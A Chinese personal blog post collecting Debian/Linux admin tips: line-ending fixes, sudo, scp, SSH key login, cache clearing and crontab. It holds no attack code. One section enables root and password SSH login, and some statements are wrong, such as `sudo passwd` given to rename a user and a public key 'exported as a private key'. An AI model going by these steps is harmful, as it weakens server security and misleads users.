<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Debian Linux命令其环境配置 | 高级软件测试开发网</title><meta name="keywords" content="Java,Python"><meta name="author" content="测小妹"><meta name="copyright" content="测小妹"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="&#x2F;bin&#x2F;bash^M 坏的解释器 没有那个文件或目录执行shell脚本是报错：&#x2F;bin&#x2F;bash^M: 坏的解释器: 没有那个文件或目录 是因为该文件在windows系统上打开过，关闭后其中的空格符号和Linux的不同，导致这个报错，我们可以通过sed命令与正则的配合将文件中的空格符号替换成linux的空格： 解决方案执行如下命令即可: 1sed -i &amp;#x27;s&#x2F;\r$&#x2F;&#x2F;&amp;#x27; b"><meta property="og:type" content="article"><meta property="og:title" content="Debian Linux命令其环境配置"><meta property="og:url" content="https://seniortesting.club/posts/2S29MCV/index.html"><meta property="og:site_name" content="高级软件测试开发网"><meta property="og:description" content="&#x2F;bin&#x2F;bash^M 坏的解释器 没有那个文件或目录执行shell脚本是报错：&#x2F;bin&#x2F;bash^M: 坏的解释器: 没有那个文件或目录 是因为该文件在windows系统上打开过，关闭后其中的空格符号和Linux的不同，导致这个报错，我们可以通过sed命令与正则的配合将文件中的空格符号替换成linux的空格： 解决方案执行如下命令即可: 1sed -i &amp;#x27;s&#x2F;\r$&#x2F;&#x2F;&amp;#x27; b"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/girl15.jpeg"><meta property="article:published_time" content="2021-03-26T12:02:00.358Z"><meta property="article:modified_time" content="2021-03-27T12:21:33.531Z"><meta property="article:author" content="测小妹"><meta property="article:tag" content="Java"><meta property="article:tag" content="Python"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/girl15.jpeg"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://seniortesting.club/posts/2S29MCV/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容：${query}"}},translate:void 0,noticeOutdate:void 0,highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"天",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:void 0,lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体",cht_to_chs:"你已切换为简体",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#49b1f5",bgDark:"#121212",position:"top-center"},source:{jQuery:"https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js",justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js",css:"https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css"},fancybox:{js:"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js",css:"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"}},isPhotoFigcaption:!1,islazyload:!1,isanchor:!1}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2021-03-27 20:21:33"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)});const t=saveToLocal.get("aside-status");void 0!==t&&("hide"===t?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));const o=saveToLocal.get("global-font-size");void 0!==o&&document.documentElement.style.setProperty("--global-font-size",o+"px")})(window)</script><style>.card-announcement .social-button{margin:.6rem 0 0 0;text-align:center}.card-announcement .social-button a{display:block;margin:.2rem 0;background-color:var(--btn-bg);color:var(--btn-color);line-height:1.6rem;transition:all .3s;position:relative;z-index:1}</style><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="高级软件测试开发网" type="application/atom+xml"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/alterhu2020/CDN/img/blog/avatar.png" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">117</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">42</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">65</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i> <span>找文章</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">高级软件测试开发网</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i> <span>找文章</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>链接</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Debian Linux命令其环境配置<a class="post-edit-link" href="https://github.com/seniortesting/seniortesting.club.site/edit/main/source/_posts/操作系统/Linux命令其环境配置.md" rel="external nofollow noreferrer" title="编辑" target="_blank"><i class="fas fa-pencil-alt"></i></a></h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon fas fa-history"></i><span class="post-meta-label">更新于</span><time datetime="2021-03-27T12:21:33.531Z" title="undefined 2021-03-27 20:21:33">2021-03-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>22分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="Debian Linux命令其环境配置"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/2S29MCV/#post-comment"><span id="twikoo-count"></span></a></span></div></div></div><article class="post-content" id="article-container"><h2 id="bin-bash-M-坏的解释器-没有那个文件或目录"><a href="#bin-bash-M-坏的解释器-没有那个文件或目录" class="headerlink" title="/bin/bash^M 坏的解释器 没有那个文件或目录"></a>/bin/bash^M 坏的解释器 没有那个文件或目录</h2><p>执行shell脚本是报错：/bin/bash^M: 坏的解释器: 没有那个文件或目录</p><p>是因为该文件在windows系统上打开过，关闭后其中的空格符号和Linux的不同，导致这个报错，我们可以通过sed命令与正则的配合将文件中的空格符号替换成linux的空格：</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>执行如下命令即可:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/\r$//&#x27; bootstrap.sh</span><br></pre></td></tr></table></figure><h2 id="bash-sudo-command-not-found"><a href="#bash-sudo-command-not-found" class="headerlink" title="-bash: sudo: command not found"></a>-bash: sudo: command not found</h2><p>在debian系统中可能会报这个错误，执行如下安装<code>sudo</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt install sudo</span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> nano /etc/sudoers</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 检查对应的sudo组是否有所有的权限：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Allow members of group sudo to execute any <span class="built_in">command</span></span></span><br><span class="line"><span class="meta">%</span><span class="bash">sudo   ALL=(ALL:ALL) ALL</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 以上的设置说明sudo已经有所有的权限，这样设置即可。</span></span><br></pre></td></tr></table></figure><h2 id="nano命令查找字符串search"><a href="#nano命令查找字符串search" class="headerlink" title="nano命令查找字符串search"></a>nano命令查找字符串search</h2><p>当你想搜索某特定文字时，只要想成”WhereIs”而不是”Search”，事情就简单了。只要按下<strong>Ctrl+W</strong>，键入你要搜索的字符串，再按Enter就可以了。想再次搜索相同的字符串，可以直接按Alt+W。也就是搜索下一个。</p><p>注意:在nano帮助文档里，Ctrl-键被表示为一个脱字符（^），因此<strong>Ctrl+W</strong>被写成了^W，等等。Alt-键被表示为一个M（从”Meta”而来），因此Alt+W被写成了M-W。</p><h2 id="Sudo-apt-get-error-flAbsPath-on-var-lib-dpkg-status-failed-No-such-file-or-directory"><a href="#Sudo-apt-get-error-flAbsPath-on-var-lib-dpkg-status-failed-No-such-file-or-directory" class="headerlink" title="Sudo apt-get error: flAbsPath on /var/lib/dpkg/status failed - No such file or directory"></a>Sudo apt-get error: flAbsPath on /var/lib/dpkg/status failed - No such file or directory</h2><p>执行安装包安装报错： Sudo apt-get error: flAbsPath on /var/lib/dpkg/status failed - No such file or directory</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo touch &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;status</span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade</span><br></pre></td></tr></table></figure><h2 id="复制本地文件到服务器"><a href="#复制本地文件到服务器" class="headerlink" title="复制本地文件到服务器"></a>复制本地文件到服务器</h2><p><strong>scp - secure copy (remote file copy program)</strong></p><ol><li>本地Windows下执行文件复制到指定目录<br>the <strong>.</strong> just indicates the current directory path.</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">D:\linux&gt; scp [source file] [username]@[destination server]:.</span><br><span class="line">D:\linux&gt; scp cool_stuff.txt pi@192.168.1.17:.</span><br><span class="line">D:\linux&gt; scp cool_stuff.txt pi@192.168.1.17:&#x2F;this&#x2F;path&#x2F;right&#x2F;here</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>下载远程服务端文件到本地</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp sanjeev@example.com:cool_stuff.txt &#x2F;this&#x2F;path&#x2F;right&#x2F;here</span><br></pre></td></tr></table></figure><h2 id="列出tar-gz压缩包的文件"><a href="#列出tar-gz压缩包的文件" class="headerlink" title="列出tar.gz压缩包的文件"></a>列出tar.gz压缩包的文件</h2><p>命令: <code>tar tzf test.tar.gz</code></p><h2 id="Linux密钥登录和用户名密码登录"><a href="#Linux密钥登录和用户名密码登录" class="headerlink" title="Linux密钥登录和用户名密码登录"></a>Linux密钥登录和用户名密码登录</h2><p>对于Linux服务器，默认以密码登陆，安全性比较差，很早前就有计划修改为使用密钥登陆，一直觉得比较麻烦搁置着，其实步骤并不难，只是当时没觉得安全问题有那么严重而已。如果你也是这么认为，那么可以尝试登陆Linux服务器，输入以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lastb | less</span><br></pre></td></tr></table></figure><p>可以看到几乎每天都会有大量的尝试登陆存在。为了服务器安全，禁止密码登陆，使用密钥方式登陆还是必要的。这里我尽量简单的记录下我设置的过程。</p><p>配置方法</p><h3 id="1-产生公钥和私钥文件"><a href="#1-产生公钥和私钥文件" class="headerlink" title="1. 产生公钥和私钥文件"></a>1. 产生公钥和私钥文件</h3><ol><li>在服务器端使用如下命令产生公钥和私钥：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$  ssh-keygen</span><br><span class="line">Generating public&#x2F;private rsa key pair.</span><br><span class="line">Enter file in which to save the key (&#x2F;root&#x2F;.ssh&#x2F;id_rsa): &lt;&#x3D;&#x3D; 按 Enter</span><br><span class="line">Created directory &#39;&#x2F;root&#x2F;.ssh&#39;.</span><br><span class="line">Enter passphrase (empty for no passphrase): &lt;&#x3D;&#x3D; 输入密钥锁码，或直接按 Enter 留空</span><br><span class="line">Enter same passphrase again: &lt;&#x3D;&#x3D; 再输入一遍密钥锁码</span><br><span class="line">Your identification has been saved in &#x2F;root&#x2F;.ssh&#x2F;id_rsa. &lt;&#x3D;&#x3D; 私钥</span><br><span class="line">Your public key has been saved in &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub. &lt;&#x3D;&#x3D; 公钥</span><br><span class="line">The key fingerprint is:</span><br><span class="line">0f:d3:e7:1a:1c:bd:5c:03:f1:19:f1:22:df:9b:cc:08 root@host</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 当前 用户的家目录中生成了一个 <code>.ssh</code> 的隐藏目录，内含两个密钥文件。<code>id_rsa</code> 为私钥，<code>id_rsa.pub</code> 为公钥。</p><ul><li><p>关于此处操作对于阿里云服务器也可以直接在阿里云的“<strong>网络与安全</strong>”-&gt; “<strong>密钥对</strong>“中由阿里云生成。阿里云： <a href="https://developer.aliyun.com/article/666688" target="_blank" rel="noopener external nofollow noreferrer">https://developer.aliyun.com/article/666688</a></p></li><li><p>你也可以使用xshell或者puttygen工具等在你自己的机器上产生对应的公钥，然后把<strong>公钥导出为私钥</strong>。</p></li></ul><h3 id="2-在服务器上安装公钥"><a href="#2-在服务器上安装公钥" class="headerlink" title="2. 在服务器上安装公钥"></a>2. 在服务器上安装公钥</h3><p>登陆需要配置密钥登陆的服务器，将公钥内容填入~/.ssh/authorized_keys文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir ~&#x2F;.ssh</span><br><span class="line">$ cat ~&#x2F;.ssh&#x2F;id_rsa.pub &gt;&gt; ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"># 或者如果是客户端自己产生的可以直接编辑</span><br><span class="line">$ nano ~&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：保存后，对<code>.ssh</code>目录和其中的<code>authorized_keys</code>公钥文件设置相应的权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chown -R root:root ~&#x2F;.ssh</span><br><span class="line">chmod -R 700  ~&#x2F;.ssh</span><br><span class="line">chmod -R 644  ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-设置SSH，打开公钥登录功能"><a href="#3-设置SSH，打开公钥登录功能" class="headerlink" title="3. 设置SSH，打开公钥登录功能"></a>3. 设置SSH，打开公钥登录功能</h3><p>接着修改ssh配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure><p>对以下内容去掉注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"># The default is to check both .ssh&#x2F;authorized_keys and .ssh&#x2F;authorized_keys2</span><br><span class="line"># but this is overridden so installations will only check .ssh&#x2F;authorized_keys</span><br><span class="line">AuthorizedKeysFile      .ssh&#x2F;authorized_keys</span><br><span class="line"># 记得最后面加上这个，否则无法进行密码登录</span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure><p>保存后重启sshd服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure><h3 id="4-XShell等客户端将私钥下载到客户端，然后使用"><a href="#4-XShell等客户端将私钥下载到客户端，然后使用" class="headerlink" title="4. XShell等客户端将私钥下载到客户端，然后使用"></a>4. XShell等客户端将私钥下载到客户端，然后使用</h3><ul><li>如果是通过<code>ssh-keygen</code>在服务器产生的公钥和私钥,从服务器下载私钥文件： <code>/root/.ssh/id_rsa</code>， 然后在xshell中进行连接使用。</li><li>如果是自己的电脑上产生的公钥，需要将公钥导出为私钥被保存，然后登录时候使用该私钥。如下截图：<br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200711175803-2020-07-11.png" alt="20200711175803-2020-07-11"></li></ul><h3 id="5-关闭原密码登陆方式-小心注意"><a href="#5-关闭原密码登陆方式-小心注意" class="headerlink" title="5. 关闭原密码登陆方式(小心注意)"></a>5. 关闭原密码登陆方式(小心注意)</h3><p>如果使用密钥登陆成功，可以继续修改ssh配置文件，关闭密码登陆：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure><p>设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure><p>保存后重启sshd服务的步骤同上，这样就完成了密钥登陆的配置。</p><h2 id="Linux中Cache内存占用过高解决办法"><a href="#Linux中Cache内存占用过高解决办法" class="headerlink" title="Linux中Cache内存占用过高解决办法"></a>Linux中Cache内存占用过高解决办法</h2><p>文章来源: <a href="https://blog.csdn.net/ailice001/article/details/80353924" target="_blank" rel="noopener external nofollow noreferrer">解决Linux buffer/cache内存占用过高的办法</a></p><ol><li>在Linux系统中，我们经常用free命令来查看系统内存的使用状态。</li><li>如何回收cache？</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &quot;echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches&quot;:表示清除pagecache。</span><br><span class="line">sudo sh -c &quot;echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches&quot;:表示清除回收slab分配器中的对象（包括目录项缓存和inode缓存）。slab分配器是内核中管理内存的一种机制，其中很多缓存数据实现都是用的pagecache。</span><br><span class="line">sudo sh -c &quot;echo 3 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches&quot;:表示清除pagecache和slab分配器中的缓存对象。</span><br></pre></td></tr></table></figure><h2 id="查看当前运行的进程的详细路径"><a href="#查看当前运行的进程的详细路径" class="headerlink" title="查看当前运行的进程的详细路径"></a>查看当前运行的进程的详细路径</h2><p>使用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top -c</span><br></pre></td></tr></table></figure><h2 id="通过进程pid查看进程"><a href="#通过进程pid查看进程" class="headerlink" title="通过进程pid查看进程"></a>通过进程pid查看进程</h2><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls  -l &#x2F;proc&#x2F;pid</span><br><span class="line">例如：</span><br><span class="line">$ ls -ls &#x2F;proc&#x2F;1245</span><br></pre></td></tr></table></figure><h2 id="查看进程占用排序"><a href="#查看进程占用排序" class="headerlink" title="查看进程占用排序"></a>查看进程占用排序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -aux --sort&#x3D;-pcpu|head -10</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="查看定时任务-crontab命令"><a href="#查看定时任务-crontab命令" class="headerlink" title="查看定时任务 crontab命令"></a>查看定时任务 crontab命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 查看定时任务</span><br><span class="line">$ crontab -l  </span><br><span class="line"># 编辑定时任务，删除或者注释定时任务</span><br><span class="line">$ crontab -e</span><br><span class="line"># 编辑，针对的是root用户</span><br><span class="line">$ nano &#x2F;etc&#x2F;crontab</span><br><span class="line"># 停止crontab，启动crontab任务</span><br><span class="line">$ systemctl stop cron</span><br><span class="line">$ systemctl restart cron</span><br></pre></td></tr></table></figure><h3 id="etc-crontab文件和crontab-e命令区别"><a href="#etc-crontab文件和crontab-e命令区别" class="headerlink" title="/etc/crontab文件和crontab -e命令区别"></a><code>/etc/crontab</code>文件和<code>crontab -e</code>命令区别</h3><ol><li>格式不同。</li><li>修改/etc/crontab这种方法只有root用户能用，而crontab -e这种所有用户都可以使用，普通用户也只能为自己设置计划任务。然后自动写入<code>/var/spool/cron/usename</code>。</li><li>不管用 <code>crontab -e</code> or 改 <code>/etc/crontab</code> 都不需要重新启动 crond 服务</li></ol><h2 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h2><p>参考设置连接: <a href="https://www.cnblogs.com/yoyotl/p/8151409.html" target="_blank" rel="noopener external nofollow noreferrer">Debian 8 设置时区和时间配置</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tzselect</span><br></pre></td></tr></table></figure><h2 id="查看文件夹各个文件大小"><a href="#查看文件夹各个文件大小" class="headerlink" title="查看文件夹各个文件大小"></a>查看文件夹各个文件大小</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -sh *</span><br></pre></td></tr></table></figure><h2 id="查看linux的架构-32-bit-or-64-bit"><a href="#查看linux的架构-32-bit-or-64-bit" class="headerlink" title="查看linux的架构 32-bit or 64-bit"></a>查看linux的架构 32-bit or 64-bit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 32位还是64位</span><br><span class="line">uname -a</span><br><span class="line"># 下面命令显示CPU架构</span><br><span class="line">lscpu</span><br><span class="line">$ cat &#x2F;proc&#x2F;cpuinfo </span><br><span class="line">Processor       : ARMv7 Processor rev 10 (v7l)</span><br><span class="line">ARMv7 (and below) is 32-bit. ARMv8 introduces the 64-bit instruction set.</span><br><span class="line">If you want to see whether your system supports 64-bit binaries, check the kernel architecture:</span><br><span class="line">$ uname -m</span><br></pre></td></tr></table></figure><h2 id="查看本机打开的端口号"><a href="#查看本机打开的端口号" class="headerlink" title="查看本机打开的端口号"></a>查看本机打开的端口号</h2><p>默认情况下Linux的1024以下端口是只有root用户才有权限占用,我们的tomcat,apache, nginx等等程序如果想要用普通用户来占用80端口的话就会抛出 java.net.BindException: Permission denied的异常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看指定的端口</span><br><span class="line">$ sudo lsof -i:port</span><br><span class="line"></span><br><span class="line">查看所有端口</span><br><span class="line">$ sudo netstat -aptn</span><br></pre></td></tr></table></figure><h2 id="创建链接"><a href="#创建链接" class="headerlink" title="创建链接"></a>创建链接</h2><p>在当前目录创建一个链接名称<code>python</code>,这个链接指向的位置是: <code>/usr/local/bin/python</code>,命令如下:<br>ln -s 源文件 目标目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;bin&#x2F;python python</span><br></pre></td></tr></table></figure><h2 id="删除缓存的安装失败的包"><a href="#删除缓存的安装失败的包" class="headerlink" title="删除缓存的安装失败的包"></a>删除缓存的安装失败的包</h2><p>进入目录<code>/var/cache/apt/archives</code>,删除下面的所有.deb文件即可</p><h2 id="修改用户名"><a href="#修改用户名" class="headerlink" title="修改用户名"></a>修改用户名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd</span><br></pre></td></tr></table></figure><h2 id="ssh登录失败"><a href="#ssh登录失败" class="headerlink" title="ssh登录失败"></a>ssh登录失败</h2><ol><li>进入谷歌云实例面板</li><li>切换到root角色,命令: <code>sudo -i</code></li><li>修改SSH配置文件<code>/etc/ssh/sshd_config</code>为如下内容:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Authentication:</span><br><span class="line">PermitRootLogin yes &#x2F;&#x2F;默认为no，需要开启root用户访问改为yes</span><br><span class="line"></span><br><span class="line"># Change to no to disable tunnelled clear text passwords</span><br><span class="line">PasswordAuthentication yes &#x2F;&#x2F;默认为no，改为yes开启密码登陆</span><br></pre></td></tr></table></figure><ol start="4"><li>给root用户设置密码 <code>passwd root</code></li><li>重启ssh服务: <code>/etc/init.d/ssh restart</code></li><li>在xshell中，直接使用root账号密码登录。</li></ol><p>在客户端或者服务端进行如下ssh链接,查看ssh登录失败的log:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; ssh -vvv alterhu2020@host </span><br></pre></td></tr></table></figure><p>On the server end, check the logs. <code>/var/log/auth.log</code> will give you a pretty good idea about what happens when you try to login, look for messages that contain sshd. There are a variety of reasons why authentication could be failing, ranging from simple (you aren’t using the right username) to more complicated 